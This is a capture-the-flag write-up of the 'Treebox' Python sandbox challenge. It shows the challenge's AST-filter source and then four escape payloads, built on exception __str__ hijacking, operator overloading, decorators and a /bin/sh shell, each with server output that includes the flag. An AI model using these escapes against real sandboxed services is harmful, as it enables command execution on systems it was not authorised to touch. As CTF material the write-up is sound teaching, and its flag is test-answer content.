# Treebox

Categories: Sandbox

Description:
> I think I finally got Python sandboxing right.
>
> `% nc treebox.2022.ctfcompetition.com 1337` <br/>
>
> [challenge.zip](resources/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301.zip)<br/>

**Tags:** sandbox, python escape, creative

## Takeaways

* When stuck, take a break and some fresh air
* Read the documentation

## Solution

The source code of the challenge is supper small:

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

Let's make a few observations:

* Ubuntu 22.04 has python version 3.10.4 by default
* We can execute arbitrary python code, except for `import` statements and explicitly calling functions via `()` (e.g. we can't call `open()`)
* We want to dump the contents of the `flag` file
* Our code is passed into [exec](https://docs.python.org/3/library/functions.html#exec), and according to to the documentation, it has access to all the globals and locals as it is executed in the scope of the file. This means that we already have available the `os` and `sys` modules and can access `os.system`.
* [compile](https://docs.python.org/3/library/functions.html#compile) is invoked twice; once to generate the AST and once to generate a code object.
  * The AST generation call is equivalent to [ast.parse](https://docs.python.org/3/library/ast.html#ast.parse)
* The `line` variable can contain more than just "--END" in contrast to what the message says.

Now that we have developed an intuition with the application, here are some ideas:

1. Operator overloading
2. Decorators
3. We cannot directly create objects via explicit invocation to constructors, e.g. `x = set()`
4. `raise Exception` is a shorthand for `raise Exception()` according to the [documentation](https://docs.python.org/3/tutorial/errors.html#raising-exceptions).
    * In combination with subclasses, we can technically define our own classes and instantiate objects
5. `mro` (method resolution order)
6. Since `compile` is invoked twice, we could make AST differ from the returned compiled code. Something relevant from the [documentation](https://docs.python.org/3/library/ast.html#ast.parse) here is:
    > Warning
    >
    > Note that successfully parsing source code into an AST object doesn’t guarantee that the source code provided is valid Python code that can be executed as the compilation step can raise further `SyntaxError` exceptions. For instance, the source `return 42` generates a valid AST node for a return statement, but it cannot be compiled alone (it needs to be inside a function node).
    >
    > In particular, `c` won’t do any scoping checks, which the compilation step does.
7. Replace method of existing object that gets used with `eval` or something similar

### Solution 1 - Exceptions

Let's try the following payload:

```python
class MyException(Exception):
  def __str__(self):
    return 'AAAA'
  def __repr__(self):
    return 'BBBB'
raise MyException
--END
```

and the output is:

```log
-- Executing safe code:
Traceback (most recent call last):
  File "/home/treebox.py", line 37, in <module>
    exec(compiled)
  File "input.py", line 10, in <module>
__main__.MyException: AAAA
```

Hmmm.. As we can see, our class name `MyException` and our string `AAAA` appear in the output. What if we changed the output function to something more exotic?

```python
class MyException(Exception):
  def __str__(self):
    return 'AAAA'
  def __repr__(self):
    return 'BBBB'

sys.stdout.write=os.system
sys.stderr.write=os.system

raise MyException
--END
```

and the response is:

```log
-- Executing safe code:
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 2: Syntax error: newline unexpected
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 2: Syntax error: newline unexpected
sh: 1: __main__: not found
sh: 1: MyException: not found
sh: 1: AAAA: not found
```

As we can see, both the class name (`MyException`) and our custom string message (`AAAA`) get passed to `sys.stdour.write`, which has now become `os.system`. So, let's change the string message to dump the flag!

```python
class MyException(Exception):
  def __str__(self):
    return 'cat flag'

sys.stdout.write=os.system
sys.stderr.write=os.system

raise MyException
--END
```

and the response is:

```log
-- Executing safe code:
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 2: Syntax error: newline unexpected
sh: 1: Syntax error: word unexpected (expecting ")")
sh: 2: Syntax error: newline unexpected
sh: 1: __main__: not found
sh: 1: MyException: not found
CTF{CzeresniaTopolaForsycja}
```

And as we can see, we dumped the flag!

`CTF{CzeresniaTopolaForsycja}`

### Solution 2 - Operator Overloading

Let's try to use now operator overloading to dump the flag. With operator overloading we can implicitly invoke functions without using the `()` operator which corresponds to an `ast.Call` node. For example `'a'+'b'` corresponds to `'a'.__add__('b')`.

Let's play a little bit in ipython:

```python
In [9]: class Baz:
   ...:     def __init__(self):
   ...:         pass
   ...:     def __add__(self, other):
   ...:         pass
   ...:

In [10]: Baz.__add__
Out[10]: <function __main__.Baz.__add__(self, other)>

In [11]: b=Baz()

In [12]: b.__add__
Out[12]: <bound method Baz.__add__ of <__main__.Baz object at 0x7f0c38834670>>
```

The difference between a "bound method" and a "function" is that: Binding a function to an instance has the effect of fixing its first parameter to the instance. So, `b.__add__(x)` is equivalent to `Baz.__add__(b, x)`. So, we can change the `__add__` method to something like `os.system` and then use the operator `+` to indirectly invoke the function and escape the sandbox.

```python
In [13]: Baz.__add__=print

In [14]: Baz.__add__
Out[14]: <function print>

In [15]: b.__add__
Out[15]: <function print>
```

As we can see, changing `Baz.__add__` changes the function pointer for all existing instances. Also, it is no longer a bound method, but just a function. So, `b.__add__(x)` is equivalent to just `print(x)`.

*(Note: Changing only `b.__add__` instead of `Baz.__add__` does not work as intended. This is because when doing `b+x`, the method is looked up in the class of `b`.)*

However, we still have the limitation that we cannot create objects. Well, we have access to the already existing variables and can abuse them. For example, we can use the `tree` variable.

```python
In [16]: tree = compile('x=1', "input.py", 'exec', flags=ast.PyCF_ONLY_AST) # just like the challenge's code

In [17]: tree
Out[18]: <ast.Module at 0x7f0c39487940>
```

and we can modify the `ast.Module` class:

```python
ast.Module.__add__=os.system
tree+'cat flag'
--END
```

and the response contains the flag!

```log
-- Executing safe code:
CTF{CzeresniaTopolaForsycja}
```

### Solution 3 - Decorators

This is a nice chance to dive into python decorators, which I haven't really ever used. We all know that decorators are syntactic sugar. Assume the following piece of code:

```python
def uppercase_decorator(func):
  def wrapper():
    res = func()
    return res.upper()
  return wrapper
```

Then, the following code snippets are equivalent:

<table>
<tr>
<td>

```python
@uppercase_decorator
def hello_world():
  return 'hello_world'
```
</td>
<td>

```python
def hello_world():
  return 'hello_world'
hello_world = uppercase_decorator(hello_world)
```

</td>
</tr>
</table>

So, a decorator underneath actually performs a function call! Let's abuse this behavior:

```python
def cmd(_):
    return 'cat flag'

@os.system
@cmd
def exploit():
    pass
--END
```

The above snipper is equivalent to:

```python
exploit = os.system(cmd(exploit))
```

and when we submit it to the server, we get the flag in the response:

```log
-- Executing safe code:
CTF{CzeresniaTopolaForsycja}
```

### Solution 4 - Fancy

We can even get super fancy with our exploit and also pop a shell:

```python
@os.system
@(lambda _: '/bin/sh')
class _: pass
--END
```

```log
-- Executing safe code:
ls
flag
treebox.py
id
uid=1000(user) gid=1000(user) groups=1000(user)
cat flag
CTF{CzeresniaTopolaForsycja}
```

and the flag is `CTF{CzeresniaTopolaForsycja}`
